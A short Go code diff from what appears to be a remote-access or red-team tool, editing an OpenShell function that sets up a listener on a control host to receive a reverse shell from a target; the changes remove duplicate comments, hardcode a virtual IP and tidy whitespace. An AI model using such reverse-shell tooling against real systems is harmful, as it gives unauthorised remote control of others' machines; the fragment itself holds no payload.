@@ -110,8 +110,6 @@ func Heartbeat(udpTarget, targetIP, targetPort, srcIP, srcPort string) error {
 }
 
 // OpenShell opens a listener on the control host for a reverse shell from the target
-// OpenShell opens a listener on the control host for a reverse shell from the target
-// OpenShell opens a listener on the control host for a reverse shell from the target
 func OpenShell(udpTarget, targetIP, targetPort string, shellType message.ShellType) error {
 	// Obtains the source ip and picks a random port for the reverse shell
 	rawIP := network.LocalIP().String()
@@ -133,24 +131,26 @@ func OpenShell(udpTarget, targetIP, targetPort string, shellType message.ShellTy
 		return fmt.Errorf("invalid -subnet: %w", err)
 	}
 
-	virtualIP := pool.Addr()
-
 	addr := network.LocalIP().IP
 	localIP, _ := netip.AddrFromSlice(addr)
 	device, err := network.GetNetworkInterface(addr)
 	if err != nil {
 		return fmt.Errorf("invalid interface: %w", err)
 	}
+	virtualIP, err := netip.ParseAddr("172.16.0.1")
+	if err != nil {
+		return fmt.Errorf("invalid virtual ip: %w", err)
+	}
 
 	udpCfg := pcapnet.UDPConfig{DeviceName: device.Name, LocalIP: localIP, LocalPort: uint16(srcPort), ReserveUDPPort: true}
 	serverCfg := pcapnet.ServerConfig{VirtualIP: virtualIP, AddressPool: pool, MTU: 1200, MaxPeers: 1}
-	
+
 	var listener *pcapnet.TCPServer
 	listener, err = pcapnet.ListenPCAPTCP(setupCtx, udpCfg, serverCfg, srcPort)
 	if err != nil {
 		return fmt.Errorf("opening shell listener: %w", err)
 	}
-	defer listener.Close() 
+	defer listener.Close()
 	// ========= PCAP TCP STACK ==========
 
 	type connResult struct {
